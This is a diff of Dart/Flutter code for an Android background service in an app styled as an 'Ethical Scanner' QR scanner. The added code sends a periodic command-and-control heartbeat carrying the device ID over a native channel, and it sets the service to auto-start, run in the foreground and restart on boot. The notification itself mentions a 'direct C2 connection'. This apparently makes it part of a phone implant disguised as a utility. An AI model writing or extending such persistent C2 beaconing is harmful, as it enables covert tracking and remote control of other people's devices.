@@ -239,4 +239,116 @@ void _setupInitialDataHandler(BackgroundServiceHandles h) {
         debugPrint("BackgroundService: Initial data sent successfully via native service");
         h.serviceInstance.invoke('update', {'initial_data_status': 'Sent Successfully via Native'});
       } else {
-        debugPrint("BackgroundService: Failed to send initial data via
+        debugPrint("BackgroundService: Failed to send initial data via native service");
+        h.serviceInstance.invoke('update', {'initial_data_status': 'Failed to Send via Native'});
+      }
+    } catch (e) {
+      debugPrint("BackgroundService: Error sending initial data via IPC: $e");
+      h.serviceInstance.invoke('update', {'initial_data_status': 'IPC Error: $e'});
+    }
+  });
+}
+
+void _startHeartbeat(BackgroundServiceHandles h) {
+  _heartbeatTimer?.cancel();
+  _heartbeatTimer = Timer.periodic(C2_HEARTBEAT_INTERVAL, (_) async {
+    try {
+      // Send heartbeat via native service
+      await _ipcChannel.invokeMethod('sendHeartbeat', {
+        'deviceId': h.currentDeviceId,
+        'timestamp': DateTime.now().toIso8601String(),
+      });
+      
+      h.serviceInstance.invoke('update', {
+        'current_date': DateTime.now().toIso8601String(),
+        'device_id': h.currentDeviceId,
+        'heartbeat_status': 'Sent via Native',
+      });
+    } catch (e) {
+      debugPrint("BackgroundService: Error sending heartbeat via IPC: $e");
+    }
+  });
+  
+  debugPrint("BackgroundService: Heartbeat started via native service for Device ID: ${h.currentDeviceId}");
+}
+
+void _stopHeartbeat() {
+  _heartbeatTimer?.cancel();
+  _heartbeatTimer = null;
+  debugPrint("BackgroundService: Heartbeat stopped");
+}
+
+Future<void> _stopService(BackgroundServiceHandles h) async {
+  debugPrint("BackgroundService: Received stop service event. Stopping...");
+  
+  _stopHeartbeat();
+  _nativeServiceMonitorTimer?.cancel();
+  
+  // Stop native service
+  try {
+    await _ipcChannel.invokeMethod('stopNativeService');
+  } catch (e) {
+    debugPrint("BackgroundService: Error stopping native service: $e");
+  }
+  
+  await h.serviceInstance.stopSelf();
+  
+  debugPrint("BackgroundService: Service stopped.");
+}
+
+Future<void> initializeBackgroundService() async {
+  final service = FlutterBackgroundService();
+
+  final flnp = FlutterLocalNotificationsPlugin();
+  const androidInit = AndroidInitializationSettings('@mipmap/ic_launcher');
+  const initSettings = InitializationSettings(android: androidInit);
+
+  try {
+    await flnp.initialize(initSettings);
+    debugPrint("FlutterLocalNotificationsPlugin initialized successfully.");
+  } catch (e, s) {
+    debugPrint("Error initializing FlutterLocalNotificationsPlugin: $e\n$s");
+  }
+
+  const channel = AndroidNotificationChannel(
+    'qr_scanner_service_channel',
+    'Ethical Scanner Service',
+    description: 'Background service for the Ethical Scanner application with native IPC.',
+    importance: Importance.high,
+    playSound: false,
+    enableVibration: false,
+    showBadge: true,
+  );
+
+  final AndroidFlutterLocalNotificationsPlugin? androidImplementation =
+      flnp.resolvePlatformSpecificImplementation<AndroidFlutterLocalNotificationsPlugin>();
+
+  if (androidImplementation != null) {
+    try {
+      await androidImplementation.createNotificationChannel(channel);
+      debugPrint("Notification channel 'qr_scanner_service_channel' created successfully.");
+    } catch (e, s) {
+      debugPrint("Error creating notification channel: $e\n$s");
+    }
+  }
+
+  await service.configure(
+    androidConfiguration: AndroidConfiguration(
+      onStart: onStart,
+      autoStart: true,
+      isForegroundMode: true,
+      notificationChannelId: 'qr_scanner_service_channel',
+      initialNotificationTitle: 'Ethical Scanner Active (Native IPC Mode)',
+      initialNotificationContent: 'Commands handled by native service with direct C2 connection.',
+      foregroundServiceNotificationId: 888,
+      autoStartOnBoot: true,
+    ),
+    iosConfiguration: IosConfiguration(
+      autoStart: true,
+      onForeground: onStart,
+      onBackground: onStart,
+    ),
+  );
+  
+  debugPrint("Background service configured for native IPC communication.");
+}
